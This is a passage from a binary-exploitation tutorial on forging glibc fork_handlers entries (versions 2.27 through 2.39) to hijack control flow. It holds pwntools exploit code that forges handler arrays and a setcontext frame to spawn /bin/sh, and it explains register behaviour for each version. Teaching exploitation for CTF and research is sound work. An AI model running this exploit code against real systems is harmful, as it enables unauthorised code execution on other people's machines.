style="color:#00009f">not</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> extra_data</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendlineafter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&quot;Enter address, size and data: &quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string-interpolation string" style="color:#e3116c">f&quot;</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">addr</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c"> </span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation builtin">len</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">(</span><span class="token string-interpolation interpolation">data</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">)</span><span class="token string-interpolation interpolation operator" style="color:#393A34">+</span><span class="token string-interpolation interpolation number" style="color:#36acaa">2</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c"> &quot;</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">encode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> data</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendline</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">extra_data</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">interactive</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="228-229">2.28-2.29<a href="#228-229" class="hash-link" aria-label="Direct link to 2.28-2.29" title="Direct link to 2.28-2.29">​</a></h3>
<p>There&#x27;s a weird edge case that I found with <code>2.28-2.29</code>, which seems to coincide with the versions that didn&#x27;t have the <code>do_locking</code> argument (which was added in <a href="https://elixir.bootlin.com/glibc/glibc-2.30/source/nptl/register-atfork.c#L110" target="_blank" rel="noopener noreferrer">2.30</a>).</p>
<figure><img src="/assets/image (109).png" alt=""><figcaption><p><code>2.29</code> first <code>prepare_handler</code> call</p></figcaption></figure>
<p>Above we see that the <code>used</code> field is loaded into <code>rax</code>, but not into <code>rdi</code>. But after the first call:</p>
<figure><img src="/assets/image (110).png" alt=""><figcaption><p><code>2.29</code> second <code>prepare_handler</code> call</p></figcaption></figure>
<p><code>used</code> <em>is</em> loaded into <code>rdi</code>. Weird...</p>
<p>I can&#x27;t quite explain why this happens, but this is more just a word of warning, that this isn&#x27;t an exact science. If you find this happening, you can always just start by doing a <code>ret</code> to get past the first call, which would also be compatible with <code>2.30+</code>.</p>
<p>And if it doesn&#x27;t happen at all?</p>
<p>Well, <code>rdi</code> shouldn&#x27;t be used by anything else if it&#x27;s not used for <code>used</code>, so <a href="/pwn/pwn/rop-2.34+/ret2gets">ret2gets</a> would also be a possibility, however I am yet to test it.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="236">2.36+<a href="#236" class="hash-link" aria-label="Direct link to 2.36+" title="Direct link to 2.36+">​</a></h2>
<p>(The specific version used here is <code>2.39</code>)</p>
<p>You&#x27;ll have noticed that the previous section was specifically for <code>2.28-2.35</code>. This is because the implementation of <code>fork_handlers</code> changes throughout the versions. So, what&#x27;s changed now?</p>
<p>Well, not much actually. Firstly, the <code>fork_handler</code> struct has a new field: <code>id</code></p>
<figure><img src="/assets/image (66).png" alt=""><figcaption><p><a href="https://elixir.bootlin.com/glibc/glibc-2.39/source/include/register-atfork.h#L23">fork_handler</a></p></figcaption></figure>
<p>And a separate function for running <code>prefork</code> handlers has been created:</p>
<figure><img src="/assets/image (90).png" alt=""><figcaption><p><a href="https://elixir.bootlin.com/glibc/glibc-2.39/source/posix/fork.c#L40">__libc_fork</a></p></figcaption></figure>
<p>The function for running <code>prefork</code> handlers isn&#x27;t much different either:</p>
<figure><img src="/assets/image (91).png" alt=""><figcaption><p><a href="https://elixir.bootlin.com/glibc/glibc-2.39/source/posix/register-atfork.c#L128">__run_prefork_handlers</a></p></figcaption></figure>
<p>The main addition is the use of <code>id</code>. What seems to be implied by the comments here, is that now each handler has a unique <code>id</code>, which increments each time a new one is added. This means ones added later will have a larger <code>id</code>. Due to the different locking pattern here, handlers could be de-registered and/or registered when a <code>prepare_handler</code> is being executed, so it ensures that only ones that were present before the current one was are executed, therefore skipping ones with a <em>higher</em> <code>id</code>.</p>
<p>For us, all this changes is that the structure of <code>fork_handler</code> is different, and we just need to include an <code>id</code> field, where it&#x27;s increasing with each handler. The updated handlers are as follows:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">header</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> size</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> flat</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> size</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token number" style="color:#36acaa">0x10</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> addr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">handler_array</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">*</span><span class="token plain">funcs</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">assert</span><span class="token plain"> funcs</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">bytearray</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x28</span><span class="token operator" style="color:#393A34">*</span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">funcs</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> func </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">enumerate</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">funcs</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">:</span><span class="token punctuation" style="color:#393A34">:</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        off </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> i</span><span class="token operator" style="color:#393A34">*</span><span class="token number" style="color:#36acaa">0x28</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        data</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">off</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">off</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">8</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">func</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        data</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">off</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">0x20</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">off</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">0x28</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> data</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">forge_split</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">funcs</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> rdi</span><span class="token operator" style="color:#393A34">=</span><span class="token boolean" style="color:#36acaa">None</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    array </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> handler_array</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">*</span><span class="token plain">funcs</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> rdi </span><span class="token keyword" style="color:#00009f">is</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">not</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">None</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        size </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> rdi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">assert</span><span class="token plain"> size </span><span class="token operator" style="color:#393A34">&gt;=</span><span class="token plain"> </span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">funcs</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        addr </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">size</span><span class="token operator" style="color:#393A34">-</span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">funcs</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">*</span><span class="token number" style="color:#36acaa">0x28</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">%</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token operator" style="color:#393A34">&lt;&lt;</span><span class="token number" style="color:#36acaa">64</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">else</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        size </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">funcs</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> header</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> size</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> array</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">forge</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">funcs</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> rdi</span><span class="token operator" style="color:#393A34">=</span><span class="token boolean" style="color:#36acaa">None</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    hdr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> arr </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> forge_split</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">0x18</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">funcs</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> rdi</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">rdi</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> hdr </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> arr</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="revenge-of-the-seccomp">Revenge of the seccomp!<a href="#revenge-of-the-seccomp" class="hash-link" aria-label="Direct link to Revenge of the seccomp!" title="Direct link to Revenge of the seccomp!">​</a></h3>
<p>While these changes don&#x27;t affect the regular cases for <code>system(&quot;/bin/sh&quot;)</code> or <code>setcontext</code>, it (indirectly) affects the <code>setcontext</code> case where we need to skip <code>sigprocmask</code>. In the version of glibc I used for the demo, <code>rdx</code> is used by <code>__run_prefork_handlers</code>:</p>
<figure><img src="/assets/image (92).png" alt=""><figcaption><p>After <code>prepare_handler</code> call.</p></figcaption></figure>
<p>Here we see at <code>+128</code> that <code>rdx=5*r14</code>, where <code>r14</code> is <code>sl</code> (the number of handlers). <code>rdx</code> then gets multiplied by <code>8</code>, which ultimately means <code>r14</code> got multiplied by <code>40</code>/<code>0x28</code>, (the size of <code>fork_handler</code>). This is in preparation for the loop where it checks the <code>id</code> fields, which is why it actually points to the previous handler&#x27;s <code>id</code> field (<code>-0x30</code> instead of <code>-0x28</code>).</p>
<p>In this case, we can actually set <code>used</code> to a value that, when multiplied by 5, points to a context. This will make <code>rdi</code> a junk value, which means you can&#x27;t use <code>gets</code> to populate the context (RIP), but apart from that, it&#x27;s no problem!</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ret </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ROP</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">libc</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">find_gadget</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">&quot;ret&quot;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">address</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">addr </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">fork_handlers</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">addr_ctx </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> addr</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">0x100</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">addr_ctx </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">-</span><span class="token plain">addr_ctx</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">%</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">5</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rdi </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> addr_ctx </span><span class="token operator" style="color:#393A34">//</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">5</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> forge</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ret</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">setcontext</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">45</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> rdi</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">rdi</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> data</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ljust</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr_ctx</span><span class="token operator" style="color:#393A34">-</span><span class="token plain">addr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;X&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">data </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> setcontext</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;rdi&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token builtin">next</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">search</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&quot;/bin/sh\x00&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;rsi&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;rdx&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;rip&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">execve</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;rsp&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> addr_ctx</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">0x200</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> addr_ctx</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">assert</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\n&quot;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">not</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> data</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendlineafter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&quot;Enter address, size and data: &quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string-interpolation string" style="color:#e3116c">f&quot;</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">addr</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c"> </span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation builtin">len</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">(</span><span class="token string-interpolation interpolation">data</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">)</span><span class="token string-interpolation interpolation operator" style="color:#393A34">+</span><span class="token string-interpolation interpolation number" style="color:#36acaa">2</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c"> &quot;</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">encode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> data</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">interactive</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="227-and-prior">2.27 and prior<a href="#227-and-prior" class="hash-link" aria-label="Direct link to 2.27 and prior" title="Direct link to 2.27 and prior">​</a></h2>
<p>(The specific version used here is <code>2.27</code>)</p>
<p>You may be wondering why I&#x27;m ending with the earliest implementation. This is because the later versions are more trivial, both in how <code>fork_handlers</code> is implemented, but also how they&#x27;re exploited. This is because we no longer have the <code>rdi</code> control trick through the <code>used</code> field.</p>
<p><code>fork_handler</code> is now defined as:</p>
<figure><img src="/assets/image (93).png" alt=""><figcaption><p><a href="https://elixir.bootlin.com/glibc/glibc-2.27/source/sysdeps/nptl/fork.h#L31">fork_handler</a></p></figcaption></figure>
<p>A few more fields than before:</p>
<ul>
<li><code>next</code>: Points to next handler, as <code>__fork_handlers</code> is now a singly linked list.</li>
<li><code>refcntr</code>: Reference count of this handler.</li>
<li><code>need_signal</code>: Unused in <code>fork</code>, so we&#x27;ll ignore it.</li>
</ul>
<p>We&#x27;re no longer using a <code>dynarray</code>, so there is no <code>used</code> field to control to gain <code>rdi</code> control (cringe). Let&#x27;s have a look at <code>fork</code> then:</p>
<figure><img src="/assets/image (94).png" alt=""><figcaption><p><a href="https://elixir.bootlin.com/glibc/glibc-2.27/source/sysdeps/nptl/fork.c#L48">__libc_fork</a></p></figcaption></figure>
<p>Not much so far, it just checks <code>THREAD_SELF</code> for if the process is multi-threaded. There&#x27;s also no function for handing the fork handlers anymore: it&#x27;s incorporated into <code>fork</code> itself.</p>
<figure><img src="/assets/image (96).png" alt=""><figcaption><p><a href="https://elixir.bootlin.com/glibc/glibc-2.27/source/sysdeps/nptl/fork.c#L65">__libc_fork</a>: Access <code>__fork_handlers</code></p></figcaption></figure>
<p>First it needs to access the root of the linked list of handlers: <code>__fork_handlers</code>. However since the process could be multi-threaded <del>and they didn&#x27;t dicover locking yet</del> it needs to do it in a thread-safe way (hence the weirdness with <code>atomic_full_barrier</code> etc.) but the jist is that it will grab <code>__fork_handlers</code> if it exists, and (atomically) increment the <code>refcntr</code> to claim ownership of it, ensuring it doesn&#x27;t get freed while it&#x27;s in use here.</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</div><div class="admonitionContent_BuS1"><p>A lock doesn&#x27;t seem to be needed, as the <code>fork_handler</code> entries are constant (besides <code>refcntr</code>, which is handled atomically, therefore not susceptible to racing). While it does work, the code with locking is just nicer.</p></div></div>
<figure><img src="/assets/image (97).png" alt=""><figcaption><p><a href="https://elixir.bootlin.com/glibc/glibc-2.27/source/sysdeps/nptl/fork.c#L92">__libc_fork</a>: Executing <code>prepare_handler</code>&#x27;s</p></figcaption></figure>
<p>This now seems familiar, but instead of an accessing an array, it&#x27;s cycling through a linked list. It also saves the handlers it uses, so that it can the same ones later for <code>parent_handler</code> and <code>child_handler</code>. To do this, it needs to claim ownership, so it increments the <code>refcntr</code>.</p>
<p>Importantly, there&#x27;s no function calls with arguments present here, except for <a href="https://elixir.bootlin.com/glibc/glibc-2.27/source/stdlib/alloca.h#L35" target="_blank" rel="noopener noreferrer">alloca</a> (compiler builtin) and <a href="https://elixir.bootlin.com/glibc/glibc-2.27/source/sysdeps/x86_64/atomic-machine.h#L282" target="_blank" rel="noopener noreferrer">atomic_increment</a> (<code>asm</code> block). So unlike <code>2.28+</code>, there&#x27;s no <code>rdi</code> control, because no functions (with a first argument) are called.</p>
<p>We can write methods to forge a <code>fork_handler</code> list as follows:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">forge</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">funcs</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">assert</span><span class="token plain"> funcs</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span 